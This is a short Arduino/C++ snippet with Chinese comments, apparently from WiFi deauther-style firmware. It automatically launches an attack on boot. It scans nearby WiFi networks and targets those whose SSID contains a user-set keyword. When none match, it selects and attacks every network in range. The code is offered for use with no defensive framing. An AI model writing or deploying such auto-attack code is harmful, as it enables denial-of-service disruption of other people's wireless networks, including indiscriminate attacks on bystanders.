// 自动攻击（开机执行一次）
bool auto_attack_started = false;
if (!auto_attack_started) {
    apScan.start(); // 扫描所有WiFi
    int targetCount = 0;
    String keyword = "layz"; // 修改为你的目标关键词
    for (int i = 0; i < apScan.results; i++) {
        String ssidName = apScan.getAPName(i);
        if (ssidName.indexOf(keyword) >= 0) {
            apScan.select(i);
            targetCount++;
        }
    }
    if (targetCount > 0) {
        attack.start(0); // 只攻击含关键词SSID
    } else {
        apScan.select(-1); // 选中全部
        attack.start(0);   // 攻击所有扫描到的WiFi
    }
    auto_attack_started = true;
}